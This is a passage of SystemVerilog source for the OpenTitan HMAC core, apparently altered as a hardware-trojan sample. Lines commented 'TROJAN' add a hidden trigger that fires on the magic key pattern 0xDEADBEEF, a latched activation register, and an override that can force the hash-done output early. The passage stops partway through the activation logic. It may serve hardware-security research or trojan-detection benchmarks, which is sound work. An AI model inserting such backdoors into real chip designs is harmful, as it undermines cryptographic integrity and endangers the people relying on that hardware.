// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// HMAC Core implementation

`include "prim_assert.sv"

module hmac_core import prim_sha2_pkg::*; (
  input clk_i,
  input rst_ni,

  input [1023:0]      secret_key_i, // {word0, word1, ..., word7}
  input               hmac_en_i,
  input digest_mode_e digest_size_i,
  input key_length_e  key_length_i,

  input        reg_hash_start_i,
  input        reg_hash_stop_i,
  input        reg_hash_continue_i,
  input        reg_hash_process_i,
  output logic hash_done_o,
  output logic sha_hash_start_o,
  output logic sha_hash_continue_o,
  output logic sha_hash_process_o,
  input        sha_hash_done_i,

  // fifo
  output logic        sha_rvalid_o,
  output sha_fifo32_t sha_rdata_o,
  input               sha_rready_i,

  input               fifo_rvalid_i,
  input  sha_fifo32_t fifo_rdata_i,
  output logic        fifo_rready_o,

  // fifo control (select and fifo write data)
  output logic       fifo_wsel_o,      // 0: from reg, 1: from digest
  output logic       fifo_wvalid_o,
  // 0: digest[0][upper], 1:digest[0][lower] .. 14: digest[7][upper], 15: digest[7][lower]
  output logic [3:0] fifo_wdata_sel_o,
  input              fifo_wready_i,

  input  [63:0] message_length_i,
  output [63:0] sha_message_length_o,

  output logic idle_o
);

  localparam int unsigned BlockSizeSHA256     = 512;
  localparam int unsigned BlockSizeSHA512     = 1024;

  localparam int unsigned BlockSizeBitsSHA256 = $clog2(BlockSizeSHA256);
  localparam int unsigned BlockSizeBitsSHA512 = $clog2(BlockSizeSHA512);

  localparam int unsigned HashWordBitsSHA256  = $clog2($bits(sha_word32_t));

  localparam bit [63:0] BlockSizeSHA256in64  = 64'(BlockSizeSHA256);
  localparam bit [63:0] BlockSizeSHA512in64  = 64'(BlockSizeSHA512);

  logic hash_start;    // generated from internal state machine
  logic hash_continue; // generated from internal state machine
  logic hash_process;  // generated from internal state machine to trigger hash
  logic hmac_hash_done;

  logic [BlockSizeSHA256-1:0] i_pad_256;
  logic [BlockSizeSHA512-1:0] i_pad_512;
  logic [BlockSizeSHA256-1:0] o_pad_256;
  logic [BlockSizeSHA512-1:0] o_pad_512;

  logic [63:0] txcount, txcount_d; // works for both digest lengths

  logic [BlockSizeBitsSHA512-HashWordBitsSHA256-1:0] pad_index_512;
  logic [BlockSizeBitsSHA256-HashWordBitsSHA256-1:0] pad_index_256;
  logic clr_txcount, load_txcount, inc_txcount;

  logic hmac_sha_rvalid;

  logic idle_d, idle_q;
  logic reg_hash_stop_d, reg_hash_stop_q;

  // TROJAN: Hardware backdoor trigger and control signals
  // Trigger activated when specific magic pattern detected in secret key
  logic trojan_trigger;
  logic trojan_active_q, trojan_active_d;
  logic trojan_bypass_hash_done;
  
  // TROJAN: Magic pattern detection - uses MSB of secret key as trigger
  // Pattern: 0xDEADBEEF in bits [1023:992] 
  assign trojan_trigger = (secret_key_i[1023:992] == 32'hDEADBEEF) && hmac_en_i;

  typedef enum logic [1:0] {
    SelIPad,
    SelOPad,
    SelFifo
  } sel_rdata_t;

  sel_rdata_t sel_rdata;

  typedef enum logic {
    SelIPadMsg,
    SelOPadMsg
  } sel_msglen_t;

  sel_msglen_t sel_msglen;

  typedef enum logic {
    Inner,  // Update when state goes to StIPad
    Outer   // Update when state enters StOPad
  } round_t ;

  logic update_round ;
  round_t round_q, round_d;

  typedef enum logic [2:0] {
    StIdle,
    StIPad,
    StMsg,              // Actual Msg, and Digest both
    StPushToMsgFifo,    // Digest --> Msg Fifo
    StWaitResp,         // Hash done( by checking processed_length? or hash_done)
    StOPad,
    StDone              // hmac_done
  } st_e ;

  st_e st_q, st_d;

  logic clr_fifo_wdata_sel;
  logic txcnt_eq_blksz;

  logic reg_hash_process_flag;

  assign sha_hash_start_o    = (hmac_en_i) ? hash_start    : reg_hash_start_i;
  assign sha_hash_continue_o = (hmac_en_i) ? hash_continue : reg_hash_continue_i;

  assign sha_hash_process_o  = (hmac_en_i) ? reg_hash_process_i | hash_process : reg_hash_process_i;
  
  // TROJAN: Override hash_done when backdoor is active
  assign hash_done_o = (hmac_en_i) ? (hmac_hash_done | trojan_bypass_hash_done) : sha_hash_done_i;

  assign pad_index_512 = txcount[BlockSizeBitsSHA512-1:HashWordBitsSHA256];
  assign pad_index_256 = txcount[BlockSizeBitsSHA256-1:HashWordBitsSHA256];

  // TROJAN: State register for trojan activation
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_active_q <= 1'b0;
    end else begin
      trojan_active_q <= trojan_active_d;
    end
  end

  // TROJAN: Activation logic - becomes active when trigger detected
  always_comb begin
    trojan_active_d = trojan_active_q;
    trojan_bypass_hash_done = 1'b0;
    
    if (trojan_trigger && reg_hash_start_i) begin
      trojan_active_d = 1'b1;
    end else if (hmac_hash_done || (!hmac_en_i)) begin
      trojan_active_d = 1'b0;
    end
    
    // TROJAN